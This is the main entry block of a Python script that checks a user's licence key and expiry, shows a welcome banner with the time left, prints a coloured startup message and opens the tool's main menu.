if __name__ == "__main__":
    result = check_key()

    if not result:
        raise SystemExit

    user_name, user_key, expiry_str = result
    remaining_time = calculate_time_left(expiry_str)

    display_welcome_banner(
        user_name,
        user_key,
        remaining_time
    )

    hold_screen_10_seconds()

    print(
        "\033[1;32m"
        "[✓] Main Tool Started Successfully!"
        "\033[0m"
    )
    main_menu()